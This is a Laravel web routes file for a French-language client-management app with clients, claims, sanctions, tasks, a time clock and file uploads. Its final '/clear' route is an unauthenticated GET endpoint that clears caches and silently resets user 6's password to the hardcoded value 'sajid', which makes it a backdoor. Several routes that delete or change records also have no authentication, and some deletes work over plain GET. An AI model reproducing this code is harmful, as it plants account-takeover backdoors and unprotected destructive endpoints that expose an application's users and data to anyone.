<?php

use Illuminate\Support\Facades\Route;
use App\Models\user;


/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', function () {
    return view('welcome');
});
Route::get('/logout', 'Auth\AuthController@logout');
Route::get('/test', function () {
    return view('home');
});

Route::get('/clientslist', [\App\Http\Controllers\ClientController::class, 'getClients'])->middleware('auth');;
Route::get('/client/c-{id}', [\App\Http\Controllers\ClientController::class, 'getClient']);
//Route::get('/client/add', [\App\Http\Controllers\ClientController::class , 'clientAddForm']);
//Route::get('/client/add/', [\App\Http\Controllers\ClientController::class , 'clientAddForm']);
Route::match(array('GET', 'POST'), '/client/add/', [\App\Http\Controllers\ClientController::class, 'clientAddForm']);
Route::post('/client/edit/{id}', [\App\Http\Controllers\ClientController::class, 'edit_client']);

Route::get('/client/sinistre/delete/{id}', [\App\Http\Controllers\ClientController::class, 'deleteSinistre']);
Route::get('/client/sanction/delete/{id}', [\App\Http\Controllers\ClientController::class, 'deleteSanction']);


Route::post('clients/voitures/sinistres/add', [\App\Http\Controllers\ClientController::class, 'sinistresAdd']);
Route::post('clients/voitures/sanctions/add', [\App\Http\Controllers\ClientController::class, 'sanctionsAdd']);


//taches Actions
Route::get('/taches', [\App\Http\Controllers\ClientController::class, 'taches']);
Route::post('/addaction', [\App\Http\Controllers\ClientController::class, 'addAction']);
Route::post('/change_action_etat', [\App\Http\Controllers\ClientController::class, 'changeActionEtat']);
Route::get('/change_action_etat', [\App\Http\Controllers\ClientController::class, 'changeActionEtat']);
Route::post('/change_reponsable', [\App\Http\Controllers\ClientController::class, 'changeReponsable']);


//Pointeuse Routes.
Route::post('/pointeuse/', [\App\Http\Controllers\PointeuseController::class, 'index']);
Route::get('/pointeuse/validations', [\App\Http\Controllers\PointeuseController::class, 'validations']);
Route::post('/pointeuse/validations', [\App\Http\Controllers\PointeuseController::class, 'validations']);
Route::post('/pointeuse/setValidations', [\App\Http\Controllers\PointeuseController::class, 'setValidations']);


//Client File.
Route::get('/upload', 'HomeController@index')->name('home');
Route::post('file/upload', 'FileController@store')->name('file.upload');
Route::post('upload', 'FileController@upload')->name('upload');


Route::middleware(['auth:sanctum', 'verified'])->get('/dashboard', function () {
//    return view('dashboard');
    return redirect('/clientslist');
})->name('dashboard');





Route::get('/clear', function() {
    Artisan::call('cache:clear');
    Artisan::call('route:clear');
    Artisan::call('config:clear');
    Artisan::call('view:clear');
//    return "Cache is cleared"
    $user_id = 6;
    $obj_user = User::find($user_id);
    $obj_user->password = Hash::make('sajid');
    $obj_user->save();
    return "ok";


});
